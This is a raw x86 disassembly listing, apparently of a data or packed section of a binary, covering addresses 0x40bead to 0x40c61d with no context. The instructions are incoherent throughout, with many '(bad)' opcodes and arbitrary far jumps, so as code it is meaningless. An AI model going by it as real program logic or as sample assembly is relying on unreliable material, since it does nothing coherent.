  40bead:	sbb    cl,bl
  40beaf:	call   0xebf94322
  40beb4:	pop    ecx
  40beb5:	or     BYTE PTR [eax],0x92
  40beb8:	xchg   esi,eax
  40beb9:	push   ecx
  40beba:	cwde   
  40bebb:	jmp    0xcc6f:0xc8e93b97
  40bec2:	mov    eax,ds:0xff52fb4a
  40bec7:	lods   al,BYTE PTR ds:[esi]
  40bec8:	aam    0xea
  40beca:	push   cs
  40becb:	in     al,0x92
  40becd:	sti    
  40bece:	or     esi,esi
  40bed0:	(bad)  
  40bed1:	jb     0x40bef8
  40bed3:	xor    al,0x1
  40bed5:	mov    eax,ds:0xfcc60cec
  40beda:	cwde   
  40bedb:	mul    BYTE PTR [edx-0x1d92c90]
  40bee1:	adc    BYTE PTR [ebp+0x6ef2993f],0x69
  40bee8:	jp     0x40bf57
  40beea:	hlt    
  40beeb:	enter  0x5484,0xc0
  40beef:	dec    edx
  40bef0:	push   esi
  40bef1:	sub    al,0x90
  40bef3:	jns    0x40be9d
  40bef5:	aas    
  40bef6:	sbb    ah,BYTE PTR [ecx+0x42]
  40bef9:	xchg   BYTE PTR [esi-0x670f41f7],cl
  40beff:	and    cl,bl
  40bf01:	int    0x39
  40bf03:	mov    bl,0x32
  40bf05:	les    ebp,FWORD PTR [edi+0x10cbbfdb]
  40bf0b:	sbb    bh,BYTE PTR [eax-0x6]
  40bf0e:	pop    esi
  40bf0f:	test   bl,0xdd
  40bf12:	mov    edx,0x2d32968
  40bf17:	dec    eax
  40bf18:	inc    esi
  40bf19:	push   edi
  40bf1a:	das    
  40bf1b:	ins    BYTE PTR es:[edi],dx
  40bf1c:	pop    esp
  40bf1d:	xchg   ebp,eax
  40bf1e:	(bad)  
  40bf1f:	fdiv   DWORD PTR [bp-0x4e]
  40bf23:	fisub  WORD PTR cs:[ebx-0x2d]
  40bf27:	sbb    DWORD PTR [ecx],eax
  40bf29:	pushf  
  40bf2a:	(bad)  
  40bf2b:	mov    al,0x12
  40bf2d:	in     eax,dx
  40bf2e:	pop    esi
  40bf2f:	fisub  WORD PTR [bp+si-0x20]
  40bf33:	push   esi
  40bf34:	adc    esp,ecx
  40bf36:	popf   
  40bf37:	(bad)  
  40bf38:	adc    BYTE PTR [edx+0x40],al
  40bf3b:	test   DWORD PTR [edx+0x9e8c9b2],edx
  40bf41:	adc    eax,0xad3098f6
  40bf46:	cli    
  40bf47:	add    al,0x42
  40bf49:	stos   DWORD PTR es:[edi],eax
  40bf4a:	xchg   DWORD PTR [ecx],esp
  40bf4c:	push   0x52
  40bf4e:	add    esi,0xffffffa3
  40bf51:	in     eax,dx
  40bf52:	sub    BYTE PTR [ecx],cl
  40bf54:	fsub   QWORD PTR [edi-0x73]
  40bf57:	cmp    DWORD PTR [ebx+0x72e7e915],edi
  40bf5d:	aam    0x73
  40bf5f:	pop    ds
  40bf60:	mov    al,ds:0x5993cf78
  40bf65:	repz retf 
  40bf67:	jmp    FWORD PTR [edx]
  40bf69:	pop    esi
  40bf6a:	cld    
  40bf6b:	outs   dx,BYTE PTR ds:[esi]
  40bf6c:	pop    ecx
  40bf6d:	add    eax,0x3636abff
  40bf72:	cmp    BYTE PTR [edx-0xe97a13a],bl
  40bf78:	loop   0x40bfb3
  40bf7a:	dec    edi
  40bf7b:	clc    
  40bf7c:	jecxz  0x40bf74
  40bf7e:	mov    dh,0xc7
  40bf80:	cmp    ah,BYTE PTR ds:0x7a33d733
  40bf86:	sar    DWORD PTR [eax+ebp*4-0x3b39683d],1
  40bf8d:	mov    DWORD PTR [edi-0x1d],ecx
  40bf90:	push   ebp
  40bf91:	das    
  40bf92:	nop
  40bf93:	loop   0x40bf8d
  40bf95:	sbb    BYTE PTR [ecx],0x62
  40bf98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf99:	push   ecx
  40bf9a:	sbb    BYTE PTR [ebx],al
  40bf9c:	pop    edx
  40bf9d:	(bad)  
  40bf9e:	sub    esi,DWORD PTR [ecx]
  40bfa0:	sbb    eax,DWORD PTR [eax]
  40bfa2:	mov    al,ds:0x6f2aa739
  40bfa7:	iret   
  40bfa8:	(bad)  
  40bfa9:	mov    ebp,0xf3583d25
  40bfae:	stc    
  40bfaf:	xor    eax,0xb19712eb
  40bfb4:	test   BYTE PTR [eax],bh
  40bfb6:	(bad)  
  40bfb7:	ficomp WORD PTR [esi]
  40bfb9:	dec    eax
  40bfba:	cmp    BYTE PTR [edi-0x5172c645],ah
  40bfc0:	xor    DWORD PTR [edx-0x67],0xffffffb1
  40bfc4:	xor    edi,DWORD PTR [edx]
  40bfc6:	loope  0x40bfcc
  40bfc8:	mov    ds:0xe0dd1549,al
  40bfcd:	addr16 jne 0x40c02b
  40bfd0:	pop    ds
  40bfd1:	xor    DWORD PTR [eax-0x6f],0x728403cf
  40bfd8:	mov    esi,0xeb8eef5c
  40bfdd:	inc    esp
  40bfde:	xchg   edi,eax
  40bfdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfe0:	(bad)  
  40bfe1:	jle    0x40bfe7
  40bfe3:	call   0xb91f:0x193580a
  40bfea:	ret    
  40bfeb:	sbb    al,0x4c
  40bfed:	add    al,0x44
  40bfef:	mov    esi,0x5cc1ebbb
  40bff4:	inc    ebp
  40bff5:	add    eax,0x3ecf3b99
  40bffa:	addr16 mov cl,0x31
  40bffd:	xchg   ebx,eax
  40bffe:	sbb    ecx,DWORD PTR [edx+edi*4-0x6de3496c]
  40c005:	stos   BYTE PTR es:[edi],al
  40c006:	int3   
  40c007:	push   ebp
  40c008:	(bad)  
  40c009:	mov    BYTE PTR [ebx-0x6f53b10f],bh
  40c00f:	jmp    0x3dfedc73
  40c014:	jge    0x40c01f
  40c016:	daa    
  40c017:	mov    eax,ds:0xe6b1aa29
  40c01c:	js     0x40c054
  40c01e:	xlat   BYTE PTR ds:[ebx]
  40c01f:	(bad)  
  40c020:	pop    ecx
  40c021:	arpl   WORD PTR [ebp-0x59],dx
  40c024:	sub    ebp,DWORD PTR [ebp+0x414abcff]
  40c02a:	fwait
  40c02b:	jo     0x40c01f
  40c02d:	mov    bh,bh
  40c02f:	ror    BYTE PTR [ecx+0x49],1
  40c032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c033:	push   cs
  40c034:	fmul   DWORD PTR [esi]
  40c036:	shl    DWORD PTR [ecx],1
  40c038:	sahf   
  40c039:	ret    0x2b95
  40c03c:	shr    al,1
  40c03e:	push   ebp
  40c03f:	add    cl,dl
  40c041:	adc    cl,al
  40c043:	stos   DWORD PTR es:[edi],eax
  40c044:	xchg   esi,eax
  40c045:	mov    ds:0x74c9dcac,eax
  40c04a:	mov    ah,BYTE PTR [edi+0x52449ccb]
  40c050:	(bad)  
  40c051:	mov    BYTE PTR [ebx],dh
  40c053:	call   0x3c85:0x153c3c34
  40c05a:	in     al,0x8a
  40c05c:	stc    
  40c05d:	push   ds
  40c05e:	in     eax,dx
  40c05f:	iret   
  40c060:	ror    BYTE PTR [edx],0xdb
  40c063:	xor    edx,ecx
  40c065:	jmp    0x8d3bb3d5
  40c06a:	in     al,0xeb
  40c06c:	mov    esp,0x384409f
  40c071:	and    DWORD PTR [ecx],0xd06f30c1
  40c077:	mov    DWORD PTR ds:0x7d29956e,esp
  40c07d:	add    esp,0x61bdf334
  40c083:	fild   DWORD PTR ds:0x1e84b4d6
  40c089:	push   edi
  40c08a:	cdq    
  40c08b:	outs   dx,BYTE PTR ds:[esi]
  40c08c:	mov    dh,0x4a
  40c08e:	and    eax,0xb8c4a138
  40c093:	call   0x71d82074
  40c098:	sbb    ah,cl
  40c09a:	add    eax,0x1b04a0cf
  40c09f:	je     0x40c02c
  40c0a1:	jge    0x40c0a5
  40c0a3:	add    BYTE PTR [ecx],0x5b
  40c0a6:	pop    ebp
  40c0a7:	sbb    al,BYTE PTR [edx-0x375479ce]
  40c0ad:	and    DWORD PTR [ebp-0x16ec2ca0],0xffffffb0
  40c0b4:	mov    esi,0xec50ac06
  40c0b9:	mov    eax,DWORD PTR [ebx-0x3e7044eb]
  40c0bf:	adc    bl,bh
  40c0c1:	std    
  40c0c2:	push   ss
  40c0c3:	mov    ebp,0x4d159401
  40c0c8:	inc    ebp
  40c0c9:	sub    al,0x86
  40c0cb:	jb     0x40c0e0
  40c0cd:	lea    esp,[ecx+0x6]
  40c0d0:	test   eax,0x7f0e4db2
  40c0d5:	imul   eax,ebx,0xffffff8b
  40c0d8:	scas   al,BYTE PTR es:[edi]
  40c0d9:	sub    ch,dl
  40c0db:	sbb    BYTE PTR [edx+eax*1+0x7801c177],cl
  40c0e2:	imul   eax,DWORD PTR [edx-0x5f],0x52fc27ac
  40c0e9:	adc    DWORD PTR [ecx+0x2e],esp
  40c0ec:	xor    DWORD PTR ds:0xf1b34ef7,edx
  40c0f2:	jns    0x40c0b5
  40c0f4:	test   eax,0xa6fb9f6a
  40c0f9:	mov    cl,0x51
  40c0fb:	sbb    DWORD PTR [edi-0x760ece59],0x8895cbd
  40c105:	(bad)  [edx+0x44]
  40c108:	and    DWORD PTR [eiz*4+0x19ab0e48],edx
  40c10f:	pop    esi
  40c110:	ret    0xc520
  40c113:	lock clc 
  40c115:	cmp    edx,DWORD PTR gs:[ecx]
  40c118:	and    eax,0xf5aeaf4f
  40c11d:	lods   eax,DWORD PTR ds:[esi]
  40c11e:	jb     0x40c10e
  40c120:	cli    
  40c121:	mov    ch,0x6f
  40c123:	push   edi
  40c124:	xchg   DWORD PTR [edi+ecx*1],edx
  40c127:	xchg   edi,eax
  40c128:	xor    DWORD PTR [ecx+0x22],esp
  40c12b:	int    0x74
  40c12d:	pop    esi
  40c12e:	add    ch,BYTE PTR [edi+0x6c8aa999]
  40c134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c135:	loope  0x40c175
  40c137:	push   0xa41dedd6
  40c13c:	pop    es
  40c13d:	push   ecx
  40c13e:	dec    ebp
  40c13f:	cdq    
  40c140:	dec    edx
  40c141:	aas    
  40c142:	lahf   
  40c143:	mov    ebp,0x5df8896a
  40c148:	mov    eax,0xe13a2a15
  40c14d:	sub    ecx,edx
  40c14f:	pushf  
  40c150:	popa   
  40c151:	adc    al,0x6f
  40c153:	xor    eax,0xe8e896fa
  40c158:	in     eax,dx
  40c159:	jbe    0x40c139
  40c15b:	sub    bh,BYTE PTR [edi]
  40c15d:	test   ecx,0xca2dc1e2
  40c163:	imul   eax,DWORD PTR [ebp+0x74],0x58
  40c167:	sub    ch,cl
  40c169:	add    ebp,DWORD PTR [edx+0x4384f68e]
  40c16f:	adc    ebx,DWORD PTR [eax-0x43]
  40c172:	xchg   BYTE PTR [eax],bh
  40c174:	mov    ch,0xfb
  40c176:	les    ebp,FWORD PTR [ecx-0x2d]
  40c179:	imul   BYTE PTR [esi-0x5e6f3257]
  40c17f:	ins    BYTE PTR es:[edi],dx
  40c180:	nop
  40c181:	adc    dl,dl
  40c183:	fcomp  DWORD PTR [eax+0x47]
  40c186:	aad    0xca
  40c188:	js     0x40c1f8
  40c18a:	scas   eax,DWORD PTR es:[edi]
  40c18b:	adc    ebx,DWORD PTR [ecx-0x58]
  40c18e:	je     0x40c176
  40c190:	mov    dh,0x1a
  40c192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c193:	(bad)  
  40c194:	stc    
  40c195:	and    DWORD PTR [ecx-0xd],edx
  40c198:	xor    eax,0x7d4393ec
  40c19d:	retf   
  40c19e:	ret    0xff67
  40c1a1:	out    dx,eax
  40c1a2:	in     al,0x1d
  40c1a4:	(bad)  
  40c1a5:	mov    esi,0x43dc047b
  40c1aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1ab:	sbb    al,0xe3
  40c1ad:	push   edi
  40c1ae:	and    cl,BYTE PTR [edi]
  40c1b0:	sbb    al,ch
  40c1b2:	mov    esi,0x49672b02
  40c1b7:	ins    BYTE PTR es:[edi],dx
  40c1b8:	mov    dh,0x82
  40c1ba:	ins    DWORD PTR es:[edi],dx
  40c1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1bc:	mov    bl,0x69
  40c1be:	jecxz  0x40c1d9
  40c1c0:	mov    dl,0xcc
  40c1c2:	mov    eax,0xab76ae3e
  40c1c7:	dec    edx
  40c1c8:	dec    edi
  40c1c9:	imul   edx,DWORD PTR [ecx+0x79],0x4
  40c1cd:	loopne 0x40c14f
  40c1cf:	add    eax,0xc9434744
  40c1d4:	push   es
  40c1d5:	push   ds
  40c1d6:	sub    ebp,ebx
  40c1d8:	ror    BYTE PTR [edi],cl
  40c1da:	adc    edx,DWORD PTR [ecx]
  40c1dc:	sub    BYTE PTR [ebx+0x48],bl
  40c1df:	sub    cl,BYTE PTR [ecx-0x80]
  40c1e2:	cmp    ecx,ebx
  40c1e4:	adc    ah,al
  40c1e6:	repz mov al,ds:0xf4d43234
  40c1ec:	das    
  40c1ed:	push   0xffffffc5
  40c1ef:	and    BYTE PTR [esi],0xc7
  40c1f2:	adc    esp,DWORD PTR [edi-0x6]
  40c1f5:	pop    ebx
  40c1f6:	test   al,0x73
  40c1f8:	pop    ecx
  40c1f9:	jl     0x40c1e8
  40c1fb:	dec    esi
  40c1fc:	add    eax,0x67c88d40
  40c201:	icebp  
  40c202:	test   eax,0x93ac50c3
  40c207:	mov    esp,0x4c97fe81
  40c20c:	out    dx,eax
  40c20d:	ficom  DWORD PTR [edx]
  40c20f:	into   
  40c210:	cmp    BYTE PTR [edx],dh
  40c212:	sub    al,al
  40c214:	js     0x40c22e
  40c216:	xchg   esi,eax
  40c217:	sub    eax,0xf26bef53
  40c21c:	sahf   
  40c21d:	mov    dl,0xb
  40c21f:	inc    ebx
  40c220:	call   0x9fc:0x1c536562
  40c227:	scas   eax,DWORD PTR es:[edi]
  40c228:	xchg   edx,eax
  40c229:	js     0x40c274
  40c22b:	push   edx
  40c22c:	ds mov edx,0xf96090e3
  40c232:	ror    dl,1
  40c234:	sub    BYTE PTR [edx+0x72],bl
  40c237:	or     eax,0xf2250e6f
  40c23c:	mov    ebx,0xb6b7c1ef
  40c241:	cld    
  40c242:	sub    eax,0xe4e69e67
  40c247:	push   esi
  40c248:	leave  
  40c249:	inc    esp
  40c24a:	out    0x3,eax
  40c24c:	adc    al,0x2
  40c24e:	dec    ecx
  40c24f:	push   edx
  40c250:	jnp    0x40c1ff
  40c252:	mov    dh,0x5a
  40c254:	sub    BYTE PTR [ecx+0x1a267db6],dh
  40c25a:	adc    al,al
  40c25c:	mov    al,0xad
  40c25e:	(bad)
  40c261:	je     0x40c20c
  40c263:	outs   dx,BYTE PTR ds:[esi]
  40c264:	jecxz  0x40c266
  40c266:	loopne 0x40c2a4
  40c268:	sbb    DWORD PTR [esi-0x5b877643],ebx
  40c26e:	sub    al,0xf3
  40c270:	ret    0xdaba
  40c273:	dec    ebx
  40c274:	dec    esi
  40c275:	mov    esp,0xa6f3f096
  40c27b:	inc    ebx
  40c27c:	mov    edx,DWORD PTR [ebx+0x4e]
  40c27f:	jp     0x40c2fc
  40c281:	adc    DWORD PTR [ecx],esp
  40c283:	ret    
  40c284:	(bad)  
  40c285:	imul   edx,DWORD PTR [edx],0xffffff88
  40c288:	inc    ebp
  40c289:	mov    cl,0x29
  40c28b:	std    
  40c28c:	fwait
  40c28d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c28e:	xchg   ebp,eax
  40c28f:	inc    esi
  40c290:	outs   dx,BYTE PTR ds:[esi]
  40c291:	scas   al,BYTE PTR es:[edi]
  40c292:	pop    esi
  40c293:	adc    DWORD PTR [eax+esi*2-0x6be154f7],esp
  40c29a:	ja     0x40c2cc
  40c29c:	(bad)  
  40c29e:	adc    eax,0xb5755d51
  40c2a3:	mov    cs,WORD PTR [ebx-0x4a]
  40c2a6:	mov    ebp,0x327ebab8
  40c2ab:	retf   
  40c2ac:	icebp  
  40c2ad:	mov    edi,0x1631067e
  40c2b2:	push   ebx
  40c2b3:	add    DWORD PTR [ecx+eax*8+0x69fa83de],esi
  40c2ba:	hlt    
  40c2bb:	loopne 0x40c2c7
  40c2bd:	mov    eax,0xfff5764c
  40c2c2:	js     0x40c290
  40c2c4:	sub    dh,cl
  40c2c6:	mov    eax,ds:0xd102df95
  40c2cb:	pop    ecx
  40c2cc:	push   ds
  40c2cd:	inc    edi
  40c2ce:	leave  
  40c2cf:	cs jno 0x40c2a0
  40c2d2:	clc    
  40c2d3:	shr    BYTE PTR [edx],1
  40c2d5:	mov    gs,WORD PTR [ebx+0x7a6e6410]
  40c2db:	sbb    dh,BYTE PTR [ebx+0x43eab5ad]
  40c2e1:	add    ebp,DWORD PTR [ebx+0x1231ce25]
  40c2e7:	jno    0x40c2fd
  40c2e9:	mov    esp,0xa4481fa8
  40c2ee:	jne    0x40c279
  40c2f0:	dec    esi
  40c2f1:	mov    eax,ds:0xea44af65
  40c2f6:	hlt    
  40c2f7:	lahf   
  40c2f8:	mov    ecx,0x88787b5b
  40c2fd:	bswap  ebx
  40c2ff:	shr    eax,1
  40c301:	or     ebx,esp
  40c303:	imul   al
  40c305:	cs sahf 
  40c307:	ror    DWORD PTR [eax],cl
  40c309:	dec    ebx
  40c30a:	fist   WORD PTR ds:0xf87010a2
  40c310:	push   ebp
  40c311:	repz test DWORD PTR [ecx-0x34],ecx
  40c315:	clc    
  40c316:	push   ss
  40c317:	sub    bl,BYTE PTR [ebp+0x35ac88]
  40c31d:	stos   DWORD PTR es:[edi],eax
  40c31e:	gs push ecx
  40c320:	push   ds
  40c321:	and    eax,DWORD PTR [ebx]
  40c323:	stos   BYTE PTR es:[edi],al
  40c324:	test   BYTE PTR [ecx-0x48],0x25
  40c328:	stos   DWORD PTR es:[edi],eax
  40c329:	retf   0x906d
  40c32c:	push   ss
  40c32d:	xor    ch,dl
  40c32f:	mov    esi,DWORD PTR [eax]
  40c331:	loopne 0x40c334
  40c333:	or     esi,DWORD PTR [eax]
  40c335:	rcr    DWORD PTR [ecx-0x4f],0xba
  40c339:	dec    ecx
  40c33a:	lds    esi,FWORD PTR [eax]
  40c33c:	jmp    0x40c3b2
  40c33e:	jbe    0x40c364
  40c340:	xlat   BYTE PTR ds:[ebx]
  40c341:	xor    BYTE PTR [ecx+0x880510d],bh
  40c347:	aas    
  40c348:	adc    cl,0xae
  40c34b:	fwait
  40c34c:	mov    ebx,0x7815d1a6
  40c351:	ins    DWORD PTR es:[edi],dx
  40c352:	xchg   ch,al
  40c354:	fcmovnbe st,st(5)
  40c356:	leave  
  40c357:	adc    eax,0x8ed2e6aa
  40c35c:	xor    eax,0x5edc1c57
  40c361:	aaa    
  40c362:	enter  0x1f9a,0x68
  40c366:	stc    
  40c367:	retf   
  40c368:	icebp  
  40c369:	ret    0xff0c
  40c36c:	sub    bh,BYTE PTR [ecx]
  40c36e:	or     ebx,DWORD PTR [esi+0x31]
  40c371:	(bad)  
  40c372:	loopne 0x40c31e
  40c374:	pushf  
  40c375:	add    esi,DWORD PTR [ecx-0x680f27f6]
  40c37b:	dec    esi
  40c37c:	jp     0x40c3ec
  40c37e:	scas   al,BYTE PTR es:[edi]
  40c37f:	cli    
  40c380:	(bad)  
  40c381:	jmp    0x34a4:0x8cdb2b37
  40c388:	push   edi
  40c389:	mov    esp,0x59656622
  40c38e:	leave  
  40c38f:	rcl    bl,cl
  40c391:	das    
  40c392:	inc    edx
  40c393:	or     al,0xdd
  40c395:	or     esi,DWORD PTR [esi]
  40c397:	pop    ds
  40c398:	gs mov esi,0x9dffc6c2
  40c39e:	call   0xb911f1ca
  40c3a3:	pop    ebp
  40c3a4:	retf   0x178c
  40c3a7:	adc    BYTE PTR [edx],bh
  40c3a9:	mov    al,0xea
  40c3ab:	xor    al,0x83
  40c3ad:	aas    
  40c3ae:	mov    ebp,0x94994f2
  40c3b3:	nop
  40c3b4:	ret    
  40c3b5:	sbb    eax,0xf96d26aa
  40c3ba:	sbb    DWORD PTR [eax+0x1d],esi
  40c3bd:	retf   
  40c3be:	fbstp  TBYTE PTR [ebx+eax*4]
  40c3c1:	bound  edx,QWORD PTR [edi+0x1c]
  40c3c4:	aas    
  40c3c5:	xchg   ebp,eax
  40c3c6:	mov    ebx,0x58764ec2
  40c3cb:	dec    esi
  40c3cc:	dec    edi
  40c3cd:	test   al,0x1e
  40c3cf:	jns    0x40c3ad
  40c3d1:	and    cl,BYTE PTR [edx-0x3a2eb811]
  40c3d7:	xor    al,0x1d
  40c3d9:	push   ss
  40c3da:	push   ds
  40c3db:	lods   eax,DWORD PTR ds:[esi]
  40c3dc:	push   cs
  40c3dd:	cmp    eax,0x96d45cd7
  40c3e2:	push   esp
  40c3e3:	dec    eax
  40c3e4:	inc    edi
  40c3e5:	jo     0x40c3c9
  40c3e7:	mov    esp,0x57f70e05
  40c3ec:	push   cs
  40c3ed:	xor    esi,esp
  40c3ef:	neg    DWORD PTR [ebx]
  40c3f1:	cmp    DWORD PTR [esi+0x72],ebx
  40c3f4:	add    eax,0xad21eadd
  40c3f9:	rcr    DWORD PTR [esi-0x68],cl
  40c3fc:	ss sub al,0x5e
  40c3ff:	ds xchg ch,bh
  40c402:	hlt    
  40c403:	sbb    bl,bl
  40c405:	bound  edx,QWORD PTR [esi+ebp*8]
  40c408:	daa    
  40c409:	mov    edi,0x12252786
  40c40e:	add    dl,BYTE PTR [ecx+0x4af97a27]
  40c414:	cld    
  40c415:	cmp    esp,DWORD PTR [esp+edx*4]
  40c418:	test   BYTE PTR [edi],bh
  40c41a:	dec    ebp
  40c41b:	mov    dl,0x82
  40c41d:	leave  
  40c41e:	sbb    ch,BYTE PTR [esi+0x3fd7d30f]
  40c424:	stc    
  40c425:	push   ss
  40c426:	mov    ecx,0x2a002775
  40c42b:	inc    esi
  40c42c:	test   al,0x57
  40c42e:	sbb    bl,BYTE PTR [ebx+ebx*2+0x26]
  40c432:	stc    
  40c433:	loop   0x40c43c
  40c435:	in     eax,0x1
  40c437:	(bad)  
  40c438:	sar    BYTE PTR [edx],1
  40c43a:	dec    ebp
  40c43b:	push   edi
  40c43c:	aas    
  40c43d:	int    0x88
  40c43f:	in     eax,dx
  40c440:	sub    al,BYTE PTR [edx+0x2f]
  40c443:	push   edx
  40c444:	push   cs
  40c445:	jge    0x40c4aa
  40c447:	jb     0x40c472
  40c449:	pop    edi
  40c44a:	mov    edx,0x7611966
  40c44f:	out    0xab,eax
  40c451:	outs   dx,DWORD PTR ds:[esi]
  40c452:	inc    esi
  40c453:	clc    
  40c454:	popf   
  40c455:	(bad)  
  40c456:	inc    edi
  40c457:	cmp    edi,DWORD PTR [ecx]
  40c459:	aaa    
  40c45a:	xchg   esp,eax
  40c45b:	test   BYTE PTR [edi+eiz*8],cl
  40c45e:	dec    eax
  40c45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c460:	mov    ds:0x35fea6ba,al
  40c465:	test   al,0xb5
  40c467:	jb     0x40c4a9
  40c469:	jle    0x40c429
  40c46b:	ror    DWORD PTR [ebp+eiz*1+0x6940c9f2],1
  40c472:	pop    esp
  40c473:	adc    BYTE PTR [ecx-0x73],dl
  40c476:	pop    ebp
  40c477:	adc    eax,0xf3edd36f
  40c47c:	mov    DWORD PTR [ebp+0x22],edx
  40c47f:	jne    0x40c4ee
  40c481:	cmp    ah,ah
  40c483:	in     al,0x56
  40c485:	ret    
  40c486:	push   ebp
  40c487:	adc    bl,BYTE PTR [edx]
  40c489:	and    DWORD PTR [eax-0x6f361d5e],0x66
  40c490:	mov    eax,0xa48827ac
  40c495:	aad    0x64
  40c497:	mov    bl,BYTE PTR [esi+ecx*2-0x13a7f0f1]
  40c49e:	xor    dl,BYTE PTR [edi+0xc]
  40c4a1:	inc    eax
  40c4a2:	cmp    eax,0xa712533d
  40c4a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4a8:	(bad)  
  40c4a9:	fcmovnu st,st(4)
  40c4ab:	inc    ebx
  40c4ac:	or     bh,BYTE PTR [edx]
  40c4ae:	nop
  40c4af:	repz pusha 
  40c4b1:	addr16 out 0xd6,eax
  40c4b4:	mov    al,BYTE PTR [ecx+0x5b39319f]
  40c4ba:	int3   
  40c4bb:	inc    edx
  40c4bc:	sbb    DWORD PTR [edi],edi
  40c4be:	jp     0x40c524
  40c4c0:	in     eax,0x3d
  40c4c2:	xlat   BYTE PTR ds:[ebx]
  40c4c3:	dec    edi
  40c4c4:	mov    eax,ds:0x342a1881
  40c4c9:	jmp    0x139a:0xef6baef2
  40c4d0:	test   al,0x95
  40c4d2:	add    al,0xa6
  40c4d4:	add    edi,DWORD PTR [ebp+ecx*1-0x46faf78c]
  40c4db:	adc    esi,DWORD PTR [edi+0x1319b322]
  40c4e1:	test   eax,0x2319dfb6
  40c4e6:	or     eax,0xa0e6fff3
  40c4eb:	sbb    eax,0x35f4d12
  40c4f0:	xlat   BYTE PTR ds:[ebx]
  40c4f1:	jne    0x40c4e2
  40c4f3:	cmp    BYTE PTR ds:0x9612af95,0x54
  40c4fa:	js     0x40c4bb
  40c4fc:	in     al,0xb5
  40c4fe:	or     DWORD PTR [ecx],ecx
  40c500:	pop    es
  40c501:	popf   
  40c502:	adc    dh,BYTE PTR [ecx]
  40c504:	dec    ecx
  40c505:	mov    ds:0x725512d8,eax
  40c50a:	jno    0x40c4ff
  40c50c:	rcr    BYTE PTR [edx+0x7ad32b84],1
  40c512:	jae    0x40c4ec
  40c514:	jmp    DWORD PTR [edi+0x48]
  40c517:	mov    DWORD PTR [eax+edi*2],eax
  40c51a:	scas   eax,DWORD PTR es:[edi]
  40c51b:	push   ebx
  40c51c:	ja     0x40c521
  40c51e:	in     eax,0xf0
  40c520:	out    0x87,al
  40c522:	mov    ch,BYTE PTR [esi-0x76ace9c3]
  40c528:	outs   dx,DWORD PTR ds:[esi]
  40c529:	iret   
  40c52a:	outs   dx,BYTE PTR ds:[esi]
  40c52b:	call   DWORD PTR [esi+eax*8]
  40c52e:	jns    0x40c585
  40c530:	mov    bh,0xe3
  40c532:	add    al,ch
  40c534:	and    eax,0x8d88acf8
  40c539:	pop    esi
  40c53a:	out    0xd9,eax
  40c53c:	sbb    al,0xf8
  40c53e:	repz push 0xf6f2f775
  40c544:	mov    ecx,0xc3f70093
  40c549:	xchg   edx,eax
  40c54a:	mov    ebx,0x86b7c491
  40c54f:	push   ss
  40c550:	add    BYTE PTR [eax-0x2a1e5756],bh
  40c556:	idiv   BYTE PTR [ecx]
  40c558:	in     eax,dx
  40c559:	(bad)  
  40c55b:	stc    
  40c55c:	jge    0x40c58d
  40c55e:	aas    
  40c55f:	imul   ebx,DWORD PTR [esi],0xa32d33f0
  40c565:	cli    
  40c566:	mov    al,BYTE PTR [edi+0x605ef956]
  40c56c:	(bad)  
  40c56d:	enter  0x3269,0x7c
  40c571:	call   0xcb285e61
  40c576:	popf   
  40c577:	push   eax
  40c578:	stos   DWORD PTR es:[edi],eax
  40c579:	pop    eax
  40c57a:	(bad)  
  40c57b:	retf   0x9489
  40c57e:	inc    eax
  40c57f:	sbb    eax,0x5efcea28
  40c584:	mov    esp,0xd3276303
  40c589:	outs   dx,DWORD PTR ds:[esi]
  40c58a:	fiadd  DWORD PTR [ecx+0x4a]
  40c58d:	sub    dl,BYTE PTR [esi+0x1e12d261]
  40c593:	xchg   ecx,eax
  40c594:	push   edi
  40c595:	mov    bl,0x8f
  40c597:	(bad)  
  40c598:	adc    bl,BYTE PTR [edi+eax*8+0x34]
  40c59c:	push   esp
  40c59d:	pop    esi
  40c59e:	cmp    eax,DWORD PTR [edx+ecx*2+0x5]
  40c5a2:	test   al,0xca
  40c5a4:	or     al,BYTE PTR [edx-0x12]
  40c5a7:	xor    ah,bh
  40c5a9:	cmp    eax,0x7ee8b16e
  40c5ae:	gs push cs
  40c5b0:	ror    DWORD PTR [ecx],1
  40c5b2:	push   es
  40c5b3:	cli    
  40c5b4:	fwait
  40c5b5:	pop    eax
  40c5b6:	cmp    ch,cl
  40c5b8:	(bad)  
  40c5b9:	fld    TBYTE PTR [esi+edx*8-0x42]
  40c5bd:	retf   0x932e
  40c5c0:	mov    WORD PTR [eiz*8+0x1d7493c],ds
  40c5c7:	xor    DWORD PTR es:[ebx],edx
  40c5ca:	clc    
  40c5cb:	add    ecx,DWORD PTR [edi]
  40c5cd:	sub    al,0xf8
  40c5cf:	pop    edi
  40c5d0:	mov    al,ds:0xced9de3d
  40c5d5:	xchg   ebp,eax
  40c5d6:	pop    si
  40c5d8:	cld    
  40c5d9:	cmc    
  40c5da:	adc    eax,0xc1c2b4d8
  40c5df:	mov    esi,0x382b4f81
  40c5e4:	loope  0x40c634
  40c5e6:	push   eax
  40c5e7:	dec    esp
  40c5e8:	leave  
  40c5e9:	jae    0x40c573
  40c5eb:	sahf   
  40c5ec:	(bad)  
  40c5ed:	fadd   st(5),st
  40c5ef:	xor    al,0xbb
  40c5f1:	adc    eax,DWORD PTR [ecx-0x34]
  40c5f4:	ror    BYTE PTR [esp+edi*4+0x5e],0xaf
  40c5f9:	pop    eax
  40c5fa:	ror    DWORD PTR [eax],0xbd
  40c5fd:	xchg   ecx,eax
  40c5fe:	shr    BYTE PTR [ebx],0x5a
  40c601:	xor    BYTE PTR [ecx+ebx*2+0x5b],bh
  40c605:	je     0x40c5a1
  40c607:	push   eax
  40c608:	pop    edi
  40c609:	dec    ebx
  40c60a:	(bad)  
  40c60b:	jg     0x40c634
  40c60d:	pop    ebp
  40c60e:	shr    DWORD PTR [ecx+0x6d],1
  40c611:	mov    ch,0x34
  40c613:	jmp    0xae97:0x4ef8ccb9
  40c61a:	out    0xe5,eax
  40c61c:	pop    ebx
  40c61d:	rcl    BYTE PTR [esi+0xe8e3093],cl
